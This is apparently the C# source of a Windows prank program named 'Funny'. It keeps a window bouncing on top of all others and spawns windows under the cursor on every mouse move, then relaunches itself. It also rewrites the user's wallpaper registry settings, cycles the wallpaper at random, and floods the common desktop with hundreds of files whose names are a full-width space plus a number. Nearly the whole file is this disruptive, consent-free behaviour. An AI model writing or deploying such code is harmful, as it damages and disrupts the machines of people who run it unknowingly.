using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Threading;
using System.Drawing.Imaging;

namespace nethost
{
    public partial class Form1 : Form
    {
        [DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        [DllImport("user32")]
        private static extern bool GetCursorPos(out Point lpPoint);

        bool ismain;
        int p = 1, f = 1, c = 0;
        int sw = Screen.PrimaryScreen.Bounds.Width, sh = Screen.PrimaryScreen.Bounds.Height, sp;
        Point last;
        Random random = new Random();

        public Form1(bool ismainl)
        {
            ismain = ismainl;
            sp = 2;
            InitializeComponent();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            TopMost = false;
            TopMost = true;
            Random rm = new Random();
            if (p == 1)
            {
                Left += sp;
                Top += sp;
            }
            if (p == 3)
            {
                Left -= sp;
                Top += sp;
            }
            if (p == 5)
            {
                Left -= sp;
                Top -= sp;
            }
            if (p == 7)
            {
                Left += sp;
                Top -= sp;
            }
            if (p == 2)
            {
                Left += sp;
                Top -= sp;
            }
            if (p == 4)
            {
                Left += sp;
                Top += sp;
            }
            if (p == 6)
            {
                Left -= sp;
                Top += sp;
            }
            if (p == 8)
            {
                Left -= sp;
                Top -= sp;
            }
            if (Left <= 0)
            {
                p = rm.Next(1, 4);
                sp = rm.Next(1, 4);
            }
            if (Top <= 0)
            {
                p = rm.Next(3, 5);
                sp = rm.Next(1, 4);
            }
            if (Left >= sw - Width)
            {
                p = rm.Next(5, 7);
                sp = rm.Next(1, 4);
            }
            if (Top >= sh - Height)
            {
                p = rm.Next(7, 9);
                sp = rm.Next(1, 4);
            }
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            Process[] process = Process.GetProcesses();
            bool kill = true;
            foreach (Process thisp in process)
                if (thisp.ProcessName.ToLower() == "explorer")
                    kill = false;
            if (kill)
                Environment.Exit(0);
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            Process.Start(@"https://github.com/Fltend/Funny");
        }

        private void timer3_Tick(object sender, EventArgs e)
        {
            Point showPoint = new Point();
            GetCursorPos(out showPoint);
            if (showPoint.X - 50 > 0)
                showPoint.X -= 50;
            else
                showPoint.X = 0;
            if (showPoint != last)
            {
                c++;
                new Form2(showPoint.X, showPoint.Y).Show();
            }
            last = showPoint;
            if (c >= 100)
            {
                Process.Start(Application.ExecutablePath, @"/onlyf");
                Thread.Sleep(2000);
                timer3.Enabled = false;
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (ismain)
            {
                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\bm1.bmp"))
                    Properties.Resources.b1.Save(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\bm1.bmp", ImageFormat.Bmp);
                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\bm2.bmp"))
                    Properties.Resources.b2.Save(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\bm2.bmp", ImageFormat.Bmp);
                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\bm3.bmp"))
                    Properties.Resources.b3.Save(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\bm3.bmp", ImageFormat.Bmp);
                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\bm4.bmp"))
                    Properties.Resources.b4.Save(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\bm4.bmp", ImageFormat.Bmp);
                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\bm5.bmp"))
                    Properties.Resources.b5.Save(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\bm5.bmp", ImageFormat.Bmp);
                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\bm6.bmp"))
                    Properties.Resources.b6.Save(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\bm6.bmp", ImageFormat.Bmp);
                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\bm7.bmp"))
                    Properties.Resources.b7.Save(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\bm7.bmp", ImageFormat.Bmp);
                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\bm8.bmp"))
                    Properties.Resources.b8.Save(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\bm8.bmp", ImageFormat.Bmp);
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
                key.SetValue("TileWallpaper", "0", RegistryValueKind.String);
                key.SetValue("WallpaperStyle", "2", RegistryValueKind.String);
                key.SetValue("WallpaperOriginX", 0, RegistryValueKind.DWord);
                key.SetValue("WallpaperOriginY", 0, RegistryValueKind.DWord);
                timer4.Enabled = true;
                Process.Start(Application.ExecutablePath, @"/onlyf");
            }
            else
            {
                pictureBox1.Visible = false;
                timer1.Enabled = false;
                timer3.Enabled = true;
                last = new Point(0, 0);
            }
        }

        private void timer4_Tick_1(object sender, EventArgs e)
        {
            int rm = random.Next(1, 30);
            if (rm > 8)
                rm = 1;
            SystemParametersInfo(20, 1, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\bm"+rm.ToString()+".bmp", 1);
        }

        private void timer4_Tick(object sender, EventArgs e)
        {
            File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + @"\　." + f.ToString(), "Funny");
            if (f < 200 && (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + @"\　." + (f + 200).ToString())))
                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + @"\　." + (f - 200).ToString());
            if (f > 200 && (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + @"\　." + (f - 200).ToString())))
                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + @"\　." + (f - 200).ToString());
            f++;
            if (f == 400)
                f = 1;
        }

        private void pictureBox1_MouseLeave(object sender, EventArgs e)
        {
            timer1.Enabled = true;
        }

        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
        {
            timer1.Enabled = false;
        }
    }
}
